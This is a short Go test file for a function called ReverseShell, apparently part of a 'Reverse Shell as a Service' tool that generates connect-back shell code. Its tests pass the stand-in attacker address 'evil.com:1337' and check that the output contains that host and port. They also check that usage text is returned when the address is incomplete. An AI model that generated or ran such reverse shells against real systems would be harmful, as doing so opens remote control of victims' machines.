package handler

import (
	"strings"
	"testing"
)

func TestReverseShellReturnsShellCode(t *testing.T) {
	result := ReverseShell("evil.com:1337")
	if !strings.Contains(result, `("evil.com",1337)`) {
		t.Error("expected shell code to contain host and port")
	}
}

func TestReverseShellReturnsUsageWithoutAddress(t *testing.T) {
	result := ReverseShell("")
	if !strings.HasPrefix(result, "# Reverse Shell as a Service") {
		t.Error("expected usage text")
	}
}

func TestReverseShellReturnsUsageWithoutPort(t *testing.T) {
	result := ReverseShell("evil.com")
	if !strings.HasPrefix(result, "# Reverse Shell as a Service") {
		t.Error("expected usage text")
	}
}
